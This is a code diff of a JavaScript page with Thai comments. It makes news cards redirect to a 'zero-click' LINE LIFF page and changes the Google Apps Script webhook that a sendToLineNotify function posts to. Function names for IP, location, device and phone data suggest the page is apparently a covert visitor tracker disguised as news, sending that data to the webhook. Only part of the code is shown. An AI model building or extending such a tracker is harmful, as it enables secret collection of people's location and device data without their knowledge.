@@ -128,7 +128,32 @@ function getUrlParameters() {
       }
     });
   });
+
+  // เพิ่ม Event Listener ให้กับการ์ดข่าว
+  setupNewsCardClickHandlers();
+
 })();
+
+// ฟังก์ชันสำหรับเพิ่ม Event Listener ให้กับการ์ดข่าว
+function setupNewsCardClickHandlers() {
+  const newsCards = document.querySelectorAll('.news-card');
+  const { caseName } = getUrlParameters(); // ดึง caseName จาก URL ปัจจุบัน
+
+  newsCards.forEach(card => {
+    card.addEventListener('click', function() {
+      console.log("คลิกการ์ดข่าว");
+      // นำทางกลับไปยังหน้า LIFF พร้อม caseName (ถ้ามี)
+      let liffUrl = 'zero-click-liff.html';
+      if (caseName && caseName !== "ไม่มีค่า") {
+        liffUrl += `?case=${encodeURIComponent(caseName)}`;
+      }
+      window.location.href = liffUrl;
+    });
+
+    // เปลี่ยน cursor เป็น pointer เพื่อให้รู้ว่าคลิกได้
+    card.style.cursor = 'pointer';
+  });
+}
 
 // สร้าง ID เฉพาะสำหรับการร้องขอ
 function generateUniqueId() {
@@ -863,7 +888,7 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycby5k2MYAXkeVvmXskDXr86iB8O2QWJ2bcYgfvXN4SNUzdzOWxrAJ7j2hK1D4ftjEEQ2/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbyHw1uENv3tWZBMQeB3onU-G7B9tUYxHxFW1QztYcSikK9gNrEAaA68NLk8OkZ0V_ko/exec';
 
   // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
   if (!dataToSend.requestId) {
